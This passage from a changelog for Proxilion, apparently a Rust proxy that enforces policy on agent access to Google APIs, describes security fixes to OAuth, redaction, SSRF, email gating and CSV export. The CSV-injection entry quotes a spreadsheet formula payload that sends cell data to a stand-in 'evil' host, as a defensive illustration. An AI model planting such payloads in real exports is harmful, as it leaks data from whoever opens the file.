  `self.x = env::var(..).ok().filter(..)`, which evaluates to `None` when the
  env var is unset. Because the TOML file is layered in **before** env, an
  operator who configured the SIEM forwarder (or NATS, or the blocked-action
  webhook) in their file and did not also set the matching env var had it
  silently wiped on boot — dropping security-audit forwarding with no error.
  Fixed to the guarded `if let Ok(v) = env::var(..)` pattern every other field
  already uses (env still overrides, an explicit empty `VAR=` still means unset).
  The same change leaves a file-set `siem_batch_size` intact on a malformed
  `PROXILION_SIEM_BATCH_SIZE` instead of downgrading to per-event delivery.
  Pinned by `from_env_layer_does_not_clobber_file_set_optional_fields_when_env_unset`.
- **`GET /api/v1/notifier/config` was unintentionally gated on `notifier:write`.**
  The route chained `get(get_config).route_layer("notifier:read").post(set_config).route_layer("notifier:write")`
  on one `MethodRouter`; axum applies the *second* `route_layer` over the whole
  router, so GET ended up wrapped by **both** scopes and a `notifier:read`-only
  token got 403 — defeating least-privilege read access (load-bearing now that
  the redacted read path above is safe to expose). Split into two same-path
  `.route()` calls, one per method, matching every sibling module.
- **`SiemHmacKey::from_hex` / `WebhookSecret::from_hex` panicked on a non-ASCII
  HMAC key.** The length guards are byte-based but the parse loop sliced
  `&hex[i..i+2]` by byte index; a multibyte codepoint (e.g. an emoji) straddling
  an even offset slices off a char boundary and panics instead of returning the
  graceful `KeyError` / `NotifierBuildError` every sibling malformed-input test
  expects. Operator-config-triggered (a stray non-ASCII char in a pasted key),
  not request-reachable. Fixed with an `is_ascii()` guard up front (valid hex is
  ASCII anyway). Pinned by `hmac_key_rejects_non_ascii_without_panicking` and
  `secret_rejects_non_ascii_without_panicking`.
- **The documented `gmail-external-send-gate` example was fail-open.** The
  canonical Layer-B example in [spec.md §9](docs/specs/spec.md) and the
  `example_policies.rs` integration test gated on `body.to_domain` — the
  *alphabetically-first* recipient domain. A send to `[bob@acme.com,
  eve@evil.example]` sorts `acme.com` first, so `to_domain not_in [acme.com]`
  evaluates false and the external recipient slips through. Production
  `config/policy.yaml` already used the correct `body.external_recipient: { equals: true }`
  boolean (computed over *all* recipients); the examples and the adapter's
  field comment (which pointed operators *at* the dangerous pattern) are now
  aligned to it. The singular `to_domain` field stays as a display/single-domain
  narrowing value with an explicit "do not gate on this" security comment.
- **`proxilion-cli policy simulate --page-limit > 500` silently truncated the
  replay to the first 500 events.** The server clamps `/api/v1/actions` `limit`
  to `1..=500` and returns a `next_before` cursor when more rows exist, but the
  CLI's `rows.len() < page_limit` page terminator then fired after the first
  page for any `--page-limit` above the cap — under-counting the replay and
  skewing the `--fail-if-delta-exceeds` CI gate. Fixed by clamping `page_limit`
  to `1..=500` so the terminator correctly identifies the final short page.
- **Gmail external-send gate failed open on an RFC-5322-malformed recipient
  header.** `split_addresses`
  ([adapters/google_gmail.rs](crates/proxy/src/adapters/google_gmail.rs))
  parsed `To`/`Cc`/`Bcc` values with `mailparse::addrparse` and, on a parse
  **error**, silently returned an empty list — dropping every recipient in
  that header. Because the adapter forwards `body.raw` to Gmail verbatim and
  Gmail's parser is more lenient than `addrparse` (an unbalanced quote like
  `"unterminated <bob@evil.example>` errors in `addrparse` but Gmail may still
  route it), the dropped recipients collapsed `body.external_recipient` to
  `false` and the flagship §9 `gmail-external-send-gate` let an external send
  through unblocked — a fail-open in a security gate. Fixed to fail **closed**:
  on a parse error, fall back to a permissive split that still surfaces any
  `@`-bearing token so domain extraction keeps flagging external recipients.
  Pinned by `split_addresses_fails_closed_on_unparseable_header` and
  `external_send_gate_is_fail_closed_on_unparseable_recipient_header`.
- **Hostile/buggy OAuth token endpoint could panic the callback/refresh task
  via `expires_in` overflow.** Both the OAuth callback
  ([oauth/routes.rs](crates/proxy/src/oauth/routes.rs)) and the token-refresh
  path ([auth_middleware.rs](crates/proxy/src/auth_middleware.rs)) computed
  expiry as `Utc::now() + Duration::seconds(expires_in.max(0))`, where
  `expires_in` is an `i64` straight off untrusted upstream JSON. `.max(0)`
  clamped only the negative side; a large positive value (e.g. `i64::MAX`)
  panics `Duration::seconds`, and even a representable-but-huge duration panics
  the `DateTime + Duration` add. Reachable because `GOOGLE_TOKEN_URL` is
  operator-overridable to arbitrary hosts. Fixed with a shared
  [`oauth::token_expiry`](crates/proxy/src/oauth/mod.rs) helper that clamps
  `expires_in` into `[0, 1 year]` (over-estimating is harmless — Google rejects
  a truly-expired access token at use time, handled by the near-expiry path).
  Pinned by `token_expiry_does_not_panic_on_i64_max_and_clamps_to_one_year`
  (+ negative-clamp and normal-TTL passthrough tests).
- **Slack request signature verified over the re-serialized timestamp, not the
  raw header.** `SlackSigningSecret::verify`
  ([notifier/slack.rs](crates/proxy/src/notifier/slack.rs)) rebuilt the HMAC
  base string from the *parsed* `u64` timestamp (`format!("v0:{ts}:")`), but
  Slack's scheme signs `v0:` + the exact header bytes + `:` + body. Any
  non-canonical-but-parseable header (e.g. a leading zero) round-trips to a
  different string, so a legitimately-signed inbound interaction would fail to
  verify (fail-closed, no security weakening, but a latent fragility). Fixed to
  sign over the raw `timestamp` header; the parsed integer is used only for the
  5-minute skew check. Pinned by
  `verify_signs_over_raw_timestamp_header_not_reparsed_u64`.
- **SMTP credentials leaked through the notifier-config "redaction".**
  `GET /api/v1/notifier/config` (scope `notifier:read`) returns
  `smtp_url_redacted = redact_url(smtp_url)`, and the spec
  (ui-less-surfaces.md §5.5) mandates redacting `smtps://user:pass@host:465`
  down to `scheme://host/...`. But `redact_url`
  ([api/notifier.rs](crates/proxy/src/api/notifier.rs)) only truncated the
  path/query — it treated the entire `user:pass@host` as the host and echoed
  it verbatim, so the SMTP **password** was exposed to any operator holding
  only read scope (and to any log that records the redacted form). The existing
  test even pinned the leak as a known behavior deferred for "a future
  tightening." Fixed by stripping userinfo (everything before the last `@` in
  the authority) in addition to the path/query; webhook/SIEM redaction (tokens
  live in the path/query) is unchanged. Pinned by
  `redact_url_strips_userinfo_credentials`.
- **`rate_limit` policy values silently wrapped on `u32` overflow.** The YAML
  decision parser ([policy-engine/src/rego.rs](crates/policy-engine/src/rego.rs)
  `parse_decision`) read `burst` / `per_seconds` as `u64` then cast `as u32`,
  so `burst: 4294967296` became `burst: 0` — an accidental block-everything
  rate limit — with no error. The serde/JSON decision path already rejects this
  (`decision.rs` has a dedicated overflow-rejection test); the YAML path now
  matches it via `u32::try_from`, failing loudly. Pinned by
  `parse_decision_rate_limit_rejects_u32_overflow`.
- **`proxilion-cli`: three operator-surface robustness fixes.** (1) The
  `policy simulate --fail-if-delta-exceeds` `--help` text claimed "Exit code 2"
  while the implementation exits 1 (matching the spec, ui-less-surfaces.md
  §3.5) — a CI author gating on exit 2 would silently treat a threshold breach
  as a pass; corrected the help to state exit 1. (2) `blocked list` byte-sliced
  the server-supplied `id` (`&id[..36]`), which would panic on a multibyte
  char straddling byte 36; switched to the char-safe `chars().take(36)` used
  everywhere else in the file. (3) `blocked show/approve/reject` and
  `policy set-mode` interpolated the operator-supplied id into the request path
  without `urlencode()`, unlike every other path-segment site in the CLI;
  routed all four through `urlencode` so an id containing `/ ? # %` stays an
  opaque segment. [crates/cli/src/main.rs](crates/cli/src/main.rs)
- **CSV/spreadsheet formula injection (CWE-1236) in the audit-action export.**
  `GET /api/v1/actions/export?format=csv` rendered rows through `esc()`
  ([api/actions.rs](crates/proxy/src/api/actions.rs) `row_to_csv_line`), which
  correctly defended CSV *structure* (quoting fields with `,` / `"` / newline
  per RFC 4180) but did **not** neutralize formula triggers. Several exported
  columns are attacker-influenced — the agent's request `path`, plus
  `action` / `vendor` / `p_0` — and flow verbatim from `action_events` into the
  CSV. A field beginning with `=`, `+`, `-`, `@`, or a leading tab/CR (e.g. a
  requested path of `/drive/v3/files/=HYPERLINK("http://evil/?x="&A1,"go")`) is
  evaluated as a formula when an operator opens the export in Excel / Google
  Sheets / LibreOffice — and the export is the documented "point your SIEM at
  this to backfill" surface that gets opened in a sheet. Fixed with the
  OWASP-recommended defang: a field starting with a trigger character is
  prefixed with a single quote and force-quoted (so the `'` survives a CSV
  re-parse), rendering the cell as literal text. Benign and numeric/UUID fields
  are unchanged. Pinned by
  `row_to_csv_line_defangs_spreadsheet_formula_injection`.
- **PCA chain verifier rejected every legitimately-narrowed (wildcard) chain as
  a false monotonicity violation.** The PIC Identity invariant is
  `child.ops ⊆ parent.ops`, and the upstream issuer (`provenance-core`
  `Pca::contains_op` / `OperationSet::is_subset_of`) defines that subset
  **wildcard-aware**: `drive:read:*` *contains* `drive:read:file/0Bw…`, and `*`
  contains everything. The proxy's verifier
  ([pic/verifier.rs](crates/proxy/src/pic/verifier.rs) `check_invariants`)
  instead compared the op strings with plain equality
  (`parent.ops.iter().any(|o| o == op)`). That is exactly the production chain
  shape — a wildcard PCA_1 (the granted-scope ops from `narrowed_ops_for_pca1`)
  narrowing to a concrete per-request PCA_2 (an adapter's
  `required_ops`, e.g. `drive:read:file/<id>`) — so **every real narrowed
  chain** verified as `intact: false` with a spurious `Monotonicity` error on
  `GET /api/v1/pca/{id}/verify`, and falsely incremented the security-critical
  `proxilion_pic_invariant_violations_total{kind="monotonicity"}` counter that
  operators alert on (the confused-deputy signal). It was a false *positive* —
  the verifier was *stricter* than the issuer, never looser, so no authority
  was wrongly accepted — but it broke the chain-verification surface for the
  documented common case and polluted a key alert. Fixed by checking subset
  with `Pca::contains_op` (the issuer's own primitive), keeping the verifier in
  lockstep with the mint. The bug was masked because the verifier's
  `build_three_deep` fixture used *identical* ops at every hop; the new
  `check_invariants_accepts_wildcard_narrowing_to_concrete_op` regression test
  pins both a concrete-under-wildcard accept and a wrong-branch reject.
- **Four operator-facing error `fix` hints pointed at non-existent or
  mislabelled CLI commands** — the `with_fix` strings on `OAuthError::UnknownClient`,
  `AppError::PolicyBlocked`, `AppError::Policy`/`OpsTemplate`, and the
  `/setup` OAuth-client check told operators to run commands marked
  `(planned, M3)` that have, in fact, shipped — or that never existed under
  the printed name. Corrected to the real, shipping commands:
  `proxilion-cli clients add` (was marked planned in [oauth/error.rs](crates/proxy/src/oauth/error.rs)
  and [api/setup.rs](crates/proxy/src/api/setup.rs)); `proxilion-cli blocked approve <id>`
  (the block-release path — the hint named a non-existent `override` subcommand,
  [adapters/error.rs](crates/proxy/src/adapters/error.rs)); and
  `proxilion-cli policy validate <file>` (the hint named a non-existent
  `policy check` and called it planned, but `policy validate` is a shipped,
  CI-safe local command — [adapters/error.rs](crates/proxy/src/adapters/error.rs)).
  These strings are surfaced verbatim in 4xx/5xx JSON envelopes and `/setup`
  output, so the drift was directly operator-visible. Also added `policy validate`
  to the README CLI cheat sheet, where it was the one shipped `policy` subcommand
  left off the table. [README.md](README.md)
- **spec.md §1.3 error-code list was missing `policy_engine_error` (500)** —
  the inline "Codes:" summary listed 8 of the 9 distinct wire strings the
  `ErrorCode` enum emits, omitting `policy_engine_error` (returned on a
  malformed policy YAML / ops-template at evaluation time — `AppError::Policy` /
  `OpsTemplate` in adapters/error.rs). Added it, and pointed the list at the
  canonical, test-pinned catalogue [docs/error-codes.md](docs/error-codes.md)
  so future drift goes to one source of truth. Also added a discoverable pointer
  to that catalogue from the README's observability section — the block-counter
  `reason`/`code` labels and the response-envelope `code` field were documented
  inline but never linked to the full table. [docs/specs/spec.md](docs/specs/spec.md)
- **docker-compose set the wrong public-URL env var** — the proxy service
  exported `PROXILION_BASE_URL`, but the code reads `PROXILION_PUBLIC_URL`
  (config.rs maps it to the internal `proxy_base_url` field — the likely source
  of the wrong guess). The misnamed var was consumed by nobody. It's latent at
  the default (the field defaults to `https://localhost:8443`, which matched the
  compose default), but it **silently breaks operator overrides**: setting
  `PROXILION_BASE_URL=https://proxilion.acme.com` in a `.env` — following the
  compose file's own name — is ignored, so the notifier's human-in-the-loop
  approve/reject links keep pointing at `localhost` in production. Renamed the
  compose key (and its `${…}` interpolation) to `PROXILION_PUBLIC_URL`; verified
  every `PROXILION_*` var compose sets is now consumed by the code.
  [docker-compose.yml](docker-compose.yml)
- **21 broken in-repo links in `spec.md`** — a set of markdown links carried a
  stale `proxilion/` path prefix (e.g. `](proxilion/crates/proxy/src/pic/)`)
  and one bare `](site/)`, left over from when the repo was nested under a
  `proxilion/` subdirectory. From `docs/specs/`, those resolve to non-existent
  `docs/specs/proxilion/...` paths even though the link *text* and the target
  files are correct. Repointed all 21 to the proper `../../…` relative path and
  verified every target exists via a repo-wide link scan. (The remaining
  `qiuth-main/*` links are deliberate citations to the external sibling
  source-of-truth project, not in this tree, and are left as-is.)
  [docs/specs/spec.md](docs/specs/spec.md)
- **Operator-facing metric name corrected: `oauth_token_refreshes_total`** —
  `ops/README.md` and three `spec.md` references named the refresh counter
  `proxilion_token_refreshes_total`, but the code emits it with the `oauth_`
  prefix (`proxilion_oauth_token_refreshes_total`). An operator pasting the
  documented name into a PromQL alert would have silently gotten no data.
  Corrected every reference repo-wide and added the `coalesced` stampede-defense
  note + `vendor` label to the ops metrics table.
  [ops/README.md](ops/README.md)
- **Grafana dashboard: added the missing "Token refresh outcomes" panel** —
  the `ops/README.md` Grafana section advertised a token-refresh panel, but the
  bundled dashboard had none. Added a `Token refresh outcomes (1m rate)`
  timeseries (`sum by (result) (rate(proxilion_oauth_token_refreshes_total[1m]))`)
  to the "Is the system healthy?" row — surfacing the `ok` / `coalesced` /
  `upstream_err` split, including the 50→1 per-bearer coalescing defense — and
  rebalanced that row to four even panels. Verified the dashboard now references
  zero metrics the code doesn't emit. [ops/grafana/proxilion.json](ops/grafana/proxilion.json)
- **Stale `MARKER` byte-length comment** — a read-filter test's comment said
  the `[redacted by proxilion read-filter]` marker is "38 bytes" while it
  asserts (correctly) `MARKER.len() == 35`; a later test even flagged it as a
  known stale doc bug. Corrected the comment to 35 bytes and updated the
  cross-reference. [adapters/read_filter.rs](crates/proxy/src/adapters/read_filter.rs)
- **Upstream response cap is now a true memory bound** (spec.md §1.4,
  surface-delight-and-correctness.md §6.8) — `read_bounded` checked the
  advertised `Content-Length`, then called `resp.bytes().await` and checked the
  length *after* buffering the whole body. An upstream that omits
  `Content-Length` and streams past the 10MB cap would be fully buffered into
  memory first, defeating the cap. It now streams the body chunk-by-chunk and
  aborts the moment the running total would exceed the cap. The byte-identical
  copy that lived in all three Google adapters is consolidated into one shared
  `adapters::read_bounded`. New tests build a `Content-Length`-less streaming
  body to exercise the rejection path (`read_bounded_rejects_oversized_body_with_no_content_length`
  + under-cap / exact-cap boundaries); `reqwest`'s `stream` feature is enabled
  as a **dev-dependency only**, so the release binary's feature set is unchanged.
  [adapters/mod.rs](crates/proxy/src/adapters/mod.rs)
- **PIC chain verifier: partial walk progress preserved on a broken chain**
  (surface-delight-and-correctness.md §6.8) — `err_to_result` hardcoded
  `links_verified: 0` (and `p_0: None`) on every verification failure, so a
  break 3 hops deep reported "nothing verified" and the dashboard chain-walker
  couldn't show how much of the chain was sound before the failed link. `walk`
  now accumulates `links_verified` + `p_0` into a `WalkProgress` that survives
  the early-return, and the error result carries it. New regression test
  `err_to_result_carries_partial_walk_progress_not_zero`.
  [pic/verifier.rs](crates/proxy/src/pic/verifier.rs)
- **OAuth callback: no orphaned encrypted token rows on empty scope
  intersection** (surface-delight-and-correctness.md §6.8) — the Google
  callback persisted the encrypted `google_tokens` row *before* checking
  whether the granted scope intersected the PCA_0 ops. An empty intersection
  then returned `PicInvariant` after the write, leaving an encrypted row no
  bearer would ever reference. The `pca1_ops` intersection + empty-rejection
  now runs immediately after the token exchange, before `persist_google_tokens`.
  [oauth/routes.rs](crates/proxy/src/oauth/routes.rs)
- **NATS subject doc comment corrected** (surface-delight-and-correctness.md
  §6.8) — `subject_for`'s comment claimed subjects "can't contain" `.` while
  the code deliberately preserves it. `.` is the NATS token separator: a dotted
  action (`gmail.messages.send`) is *meant* to expand into the
  `actions.<vendor>.gmail.messages.send` hierarchy. Rewrote the comment to say
  so and to name the chars `sanitize_token` actually neutralizes (space, `*`,
  `>`). Behavior unchanged. [forwarder/nats.rs](crates/proxy/src/forwarder/nats.rs)
- **CLI: `killswitch all` now forwards `--confirm` to the server** — it
  validated `--confirm yes` locally but never sent `confirm` in the request
  body, so a real fleet-wide kill would have been rejected by the server's
  `confirm` gate. Surfaced while wiring §3.3 dry-run.

### Added — earlier this cycle

- **CLI: shell completion** (surface-delight-and-correctness.md §3.4) —
  `proxilion-cli completion bash|zsh|fish|powershell|elvish` emits a completion
  script via `clap_complete` (offline; handled before any HTTP client is
  built). Documented in the README install section. New dependency:
  `clap_complete` (MIT/Apache-2.0, reuses clap's existing transitive deps).
- **CLI: `clients list` table** (§3.1) — `clients list` gains `--format
  pretty|json` and renders an aligned `client_id · name · created_at · revoked`
  table instead of raw JSON (`blocked list` / `policy list` already had
  tables).
- **Approval messages: absolute expiry + inline matched detail** (§4.3, §4.4) —
  Slack and email now show an absolute UTC `expires_at` (computed at send so it
  doesn't drift as the message sits unread) instead of "expires in 30m"; the
  shared window is `notifier::OVERRIDE_TOKEN_TTL_MINUTES`. Slack inlines the
  matched rule id + a full-width detail excerpt (section block, ~2900 chars)
  rather than truncating to 140; email already showed full detail.

### Changed

- **CLI: actionable parse errors** (§3.6) — `--since`, `--older-than`, and
  `--against` parse failures now name the accepted forms (RFC3339 timestamp or
  a duration like `30m` / `24h` / `7d`).

### Security

- **Path / SSRF injection closed in the Drive & Gmail adapters**
  ([surface-delight-and-correctness.md](docs/specs/surface-delight-and-correctness.md) §6.1).
  axum percent-decodes `{id}` path params before the handler sees them, so a
  `file_id` / `msg_id` carrying `/`, `?`, `#`, or an encoded slash re-injected
  path/query/fragment delimiters and could steer the upstream call to a
  *different* Google endpoint than the action label, policy layer, and PIC
  chain were evaluated against (a confused-deputy vector). The Calendar
  adapter's per-segment encoder is now promoted to a shared
  `adapters::path_segment` helper and applied at all three sites. Regression
  tests in `adapters/{mod,google_drive,google_gmail}.rs`.
- **Federation `state` claim now bound to the callback session**
  (§6.4). `FederationClaims.state` was parsed but never compared to the
  callback `state`, so a federation token minted for one session could be
  replayed into another (session fixation). `bridge_callback_body` now rejects
  on mismatch before any DB write. (Ships ahead of the still-stubbed signature
  check — see `oauth/bridge.rs`.)

### Fixed

- **Policy matcher now matches list-valued body fields** (§6.2). `apply_op`
  resolved the LHS once as a scalar, so a JSON-array field (e.g.
  `body.to_domains`) stringified to its JSON literal and `in`/`not_in`/`equals`
  never matched — silently disabling any array-valued Layer-B gate (fails
  open). The matcher now applies element-wise set semantics when
  `ctx.lookup_list` returns an array: `in` = any-element-in-set, `not_in` =
  no-element-in-set, `equals`/`not_equals` = single-value membership. Pinned
  by a new end-to-end engine test wiring the recipient-domain gate over the
  array.
- **Burst-suppressor bucket map is now bounded** (§6.3). `drain_summaries`
  only reset counters, so the `(policy_id, p_0)` map grew for the process
  lifetime on high-cardinality, partly attacker-influenced `p_0` (DoS-of-
  degree). It now prunes expired timestamps and drops idle buckets each drain,
  and emits the `proxilion_burst_buckets` gauge.
- **Retryable HTTP 429 is no longer dropped as permanent** (§6.5). The SIEM
  forwarder and webhook notifier treated all 4xx as permanent; `429 Too Many
  Requests` (and `408`) are retryable — Slack/PagerDuty/Datadog/Splunk HEC all
  rate-limit with 429. Folded into the 5xx retry branch via a shared
  `forwarder::is_retryable_4xx`, with a `proxilion_forwarder_retry_total`
  counter.
- **Still-valid bearer no longer rejected up to 60s early** (§6.6). A
  session inside the 60s pre-expiry window with no refresh token returned 401
  even though the Google access token was still valid. It now forwards the
  still-valid token and lets Google 401 naturally at true expiry; only an
  actually-expired token is rejected. Decision extracted to a pure
  `token_action` helper with unit tests.
- **PCA chain walk is depth-bounded and hop arithmetic is checked** (§6.7).
  The verifier walk followed `predecessor_id` with no cap (cold-cache DB
  amplification on a crafted deep chain) and used `parent.hop + 1` (debug
  panic / release wrap at `u32::MAX`). Added a `MAX_CHAIN_HOPS` cap returning
  a new `VerifierError::ChainTooLong`, and replaced the hop add with
  `checked_add`.

### Added

- **Marketing-site delight** ([site/index.html](site/index.html),
  surface-delight-and-correctness.md §5): a persisted dark-mode toggle
  defaulting to `prefers-color-scheme` (no framework, ~40 lines of inline JS,
  no build step), copy-to-clipboard on the quickstart commands, a mobile
  scroll-fade on the install box, and `rel="noopener noreferrer"` on every
  off-site link.
- **README** — architecture + two-layer-enforcement Mermaid diagrams, a PIC
  chain / invariants visualization, and policy-DSL + CLI + design-decision
  cheat sheets.

### Changed

- **Coverage gate honest reset — floor lowered from 60% / 60% to 35% lines /
  42% functions** ([.github/workflows/coverage.yml](.github/workflows/coverage.yml),
  qiuth-patterns.md §6.4 status block). The original 60/60 adoption floor
  (b7d618b) was set aspirationally above measured reality; a
  `cargo llvm-cov --workspace` run reports `TOTAL 36.94% lines / 43.94%
  functions` (the 40.22% number visible in the report is the *regions*
  metric — easy to misread; `--fail-under-lines` checks the line column).
  The five most recent CI runs of `coverage.yml` on `main` all exited
  `failure`. The new floor sits just under measured reality so
  the gate enforces a no-regression line the workspace actually clears.
  Biggest pull-down sources are the `proxy/api/*` HTTP handlers (0% — no
  integration tests; `crates/proxy/tests/` is empty), `proxy/server.rs`
  (0%), and `cli/src/main.rs` (3.91%). Backfilling those is the work that
  earns the next ratchet (target: 50% / 55%).

### Added

- **[`config/proxilion.example.toml`](config/proxilion.example.toml)** —
  worked example for the layered TOML config that Phase 2 of qiuth-patterns
  §2 added. Every `FileConfig` field is present, commented out, and
  annotated with its default + a one-line explanation. Operators copy
  the file and uncomment only what they want to override. Header
  documents the precedence chain (`defaults → file → env → programmatic`).
  A new `config::tests::example_toml_parses_with_defaults_only` unit
  test pins the contract — when every field is commented out the
  loader produces a builder identical to `defaults()` — so the
  example can't silently drift away from `FileConfig`.

### Changed

- **`spec.md` ui-less alignment.** Cleaned up four stale `dashboard/`
  references in [docs/specs/spec.md](docs/specs/spec.md) that survived
  the 2026-05-11 ui-less pivot: §3.3 line 124 (component inventory),
  §5.2 line 244 (architecture component table), §0.5 (status block
  pointed at the deleted `dashboard/` directory), §0.6 (compose service
  list claimed `dashboard` was wired in), and §0.7 (CI job list claimed
  a `dashboard` typecheck/lint/build job that no longer exists). All
  five sites now redirect to [`ui-less-surfaces.md`](docs/specs/ui-less-surfaces.md)
  §8.1, which is the canonical "what we deleted" record. The §0.6
  status block is rewritten to match the actual five compose services
  (`postgres`, `trust-plane`, `mock-okta`, `nats`, `proxy`); §0.7 is
  rewritten to match the actual four CI jobs (`fmt`, `clippy`, `test`,
  `build-release`) plus the four sibling workflows (`coverage`,
  `static-html-no-js`, `supply-chain`, `release`). No code touched.
- **`LogFormat` wired through `Config`** (qiuth-patterns.md §2.3
  follow-through). [crates/proxy/src/main.rs](crates/proxy/src/main.rs)
  now loads `Config` before `init_tracing` and passes `cfg.log_format`
  into the tracing subscriber. Previously `init_tracing` read
  `PROXILION_LOG_FORMAT` directly via `std::env::var`, bypassing the
  layered config — operators could not set `log_format = "pretty"`
  from `proxilion.toml`. The `#[allow(dead_code)]` annotation on
  `Config::log_format` is dropped now that the field has a consumer.

### Removed

- **`Config::from_env()` removed** (qiuth-patterns.md §2.4 Phase 3).
  The Phase 2 backward-compat shim — kept under `#[allow(dead_code)]`
  while callers migrated — had zero remaining call sites
  ([crates/proxy/src/config.rs](crates/proxy/src/config.rs)).
  `Config::load()` is now the single production entry point
  (defaults → optional TOML file → env vars); embed/test callers use
  `ConfigBuilder::defaults()…build()` directly. Module docstring updated.

### Added

- **Public-repo polish.**
  [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) — adopts Contributor
  Covenant 2.1 verbatim with project-specific scope, reporting
  channel (`hi@claygood.com` with `[proxilion-conduct]` prefix),
  and enforcement ladder.
  [.github/ISSUE_TEMPLATE/](.github/ISSUE_TEMPLATE/) — structured
  bug-report and feature-request forms with required fields
  (commit SHA, deploy mode, repro, spec section). Blank issues
  disabled to force structured context up front; security
  vulnerabilities redirected to SECURITY.md.
  [.github/PULL_REQUEST_TEMPLATE.md](.github/PULL_REQUEST_TEMPLATE.md)
  — what's-new / why / tests / deviations / pre-flight checklist.
  [Justfile](Justfile) — `just ci` runs every local CI gate;
  `just install-tools` one-shots the dev-tool installs;
  `just demo`, `just smoke`, `just up`, `just nuke` for common
  compose operations.
- **Repository docs.**
  [SECURITY.md](SECURITY.md) — vulnerability disclosure policy with
  private reporting address, response SLAs, in-scope / out-of-scope
  enumeration, and the existing-defense catalogue.
  [CONTRIBUTING.md](CONTRIBUTING.md) — spec-first contribution
  model, full CI gate matrix with local reproduction commands,
  style guidance, and the deliberate non-goals.
- **Release workflow** (`.github/workflows/release.yml`) — on `v*.*.*`
  tag push (or manual `workflow_dispatch`), builds `proxilion-cli`
  for `x86_64-unknown-linux-gnu`, `aarch64-unknown-linux-gnu`,
  `x86_64-apple-darwin`, and `aarch64-apple-darwin`, packs each
  with `LICENSE` / `README.md` / `CHANGELOG.md` into a `.tar.gz`,
  computes SHA-256 checksums, and uploads to the GitHub Release.
  Proxy binary is intentionally not shipped — operators install
  the proxy via Docker (Dockerfile + Helm chart) rather than raw
  binary. `cargo publish` step deferred until the workspace is
  crates.io-ready.
- **CI gate** (`.github/workflows/ci.yml`) — `cargo fmt --check`,
  `cargo clippy -- -D warnings`, `cargo test --workspace --locked`,
  `cargo build --release` with `RUSTFLAGS="-D warnings"`. Three lint
  families are allowed in the command line with documented rationale
  (`type_complexity`, `too_many_arguments`, `result_large_err`); all
  other warnings are errors.
- **Supply-chain CI** (`.github/workflows/supply-chain.yml`) — runs
  `cargo audit --deny warnings` *and* `cargo deny check` (advisories,
  bans, licenses, sources) on PRs, pushes to `main`, a weekly cron,
  and manual dispatch. `.cargo/audit.toml` + `deny.toml` document two
  ignored advisories with unblock conditions. `deny.toml` adds an
  MIT-compatible license allow-list, source restrictions (crates.io
  + the SHA-pinned `clay-good/provenance` git URL only), and
  duplicate-version warnings.
- **Asciinema demo recorder** (`demo/scripts/record-demo.sh`) —
  wraps `./run.sh` or any subset of scenario scripts into a
  `.cast` file under `demo/recordings/`. Closes `spec.md §4.4 dev 2`.
- **Comment-preserving `policy.yaml` edit** —
  [`policy_handle::edit_mode_in_yaml`](crates/proxy/src/policy_handle.rs)
  replaces the lossy `serde_yaml::Value` round-trip in `set_mode`
  with a line-oriented in-place edit that preserves comments, key
  ordering, blank lines, and trailing inline comments byte-for-byte.
  `serde_yaml` is the fallback for exotic YAML shapes. Closes
  `ui-less-surfaces.md §11.1`.
- **`proxilion-cli policy edit`** —
  [`cmd_policy_edit`](crates/cli/src/main.rs) opens `$EDITOR` /
  `$VISUAL` / `vi` on the live `policy.yaml` (path resolved from
  `GET /api/v1/policy`), backs up to `<path>.bak`, validates locally
  via `policy_engine::yaml::parse_policies`, rolls back on parse
  failure, hot-reloads via `POST /api/v1/policy/reload` with
  proxy-side rollback too. Closes `ui-less-surfaces.md §4.1` dev.
- **`blocked_actions.request_canonical_json`** —
  [migrations/0014_blocked_request_canonical_json.sql](migrations/0014_blocked_request_canonical_json.sql)
  + [`blocked::canonical_request_json`](crates/proxy/src/blocked.rs).
  Deterministic 4 KB-bounded JSON snapshot of the request at block
  time (method, path, vendor, action, path_params, body — body
  honoring `§5.4` default-deny). Threaded through all 9 block call
  sites in the Drive / Gmail / Calendar adapters. Surfaced on
  `GET /api/v1/blocked/{id}` and rendered in the Slack `[Why?]`
  ephemeral. Closes `spec.md §2.1 dev 3`.
- **Multi-tenant approver mapping doc**
  ([docs/install/multi-tenant-approvers.md](docs/install/multi-tenant-approvers.md))
  — three sizing tiers (<25, 25–250, 250+ approvers), Okta-SCIM
  cron-sync skeleton, rationale for static map over live IdP
  lookup on the Slack 3-second budget. Closes
  `ui-less-surfaces.md §11 Q4`.
- **Per-driver `notifier test`** —
  `POST /api/v1/notifier/test` accepts
  `{ "driver": "all|webhook|slack|email" }`. CLI plumbs
  `--driver`. Single-driver requests against an unconfigured driver
  return 412 with a `driver`-keyed envelope. Closes
  `ui-less-surfaces.md §4.1` `test slack | email | webhook` sketch.

### Changed

- **`cargo fmt --all`** ran workspace-wide; 52 files reformatted to
  rustfmt defaults. Going forward `ci.yml/fmt` keeps the workspace
  canonical.
- **Stale deviation notes** updated to match shipped reality —
  `§8.4 dev 1` (slack/email drivers exposed since `§5.3` + `§5.4`
  landed), `§5.4 dev 1` (HTML email body has been shipped via
  `multipart/alternative`), `§2.1 dev 1` (per-recipient ops-atom
  expansion landed in the `§2.2` list-valued template work).
- **`ui-less-surfaces.md §11` open questions** — all 7 now resolved,
  the last two (Q2 Slack workspace-vs-app, Q6 OTLP push vs scrape)
  as decision-tracking with rationale rather than code changes.
- **Clippy hygiene** — small inline fixes for
  `let_underscore_future`, `unnecessary_unwrap`,
  `unnecessary_get_then_check`, `needless_range_loop`, and
  `doc_lazy_continuation` so the new `ci.yml` clippy gate lands
  green on `-D warnings`. Two `from_*-takes-self` builder methods
  carry `#[allow(clippy::wrong_self_convention)]` with rationale
  (qiuth-patterns §2 fluent-builder shape).

### Security

- **Bumped `async-nats 0.38 → 0.48`** to drop the vulnerable
  `rustls-webpki 0.102.8` transitive dep. Closes 4 Dependabot
  alerts:
  - 1 HIGH — RUSTSEC-2025-XXXX (DoS via panic on malformed CRL BIT
    STRING)
  - 1 MEDIUM — webpki: CRLs not considered authoritative by
    Distribution Point
  - 2 LOW — webpki name-constraint acceptance for wildcards / URI
    names
  Workspace now resolves a single `rustls-webpki 0.103.13`.

### Tests

- 164 proxy + **58** policy-engine (was 16, **+42 new**) + 9 CLI;
  all 13 test binaries green.
- `cargo audit --deny warnings` exits 0 with the two documented
  ignores filtered.
- **Test backfill** (qiuth-patterns.md §6 ratchet plan groundwork):
  `match_expr.rs` (the entire spec.md §0.3 operator vocabulary
  interpreter — 209 LOC, previously zero inline tests) gets 33 new
  unit tests covering every operator branch (`equals` /
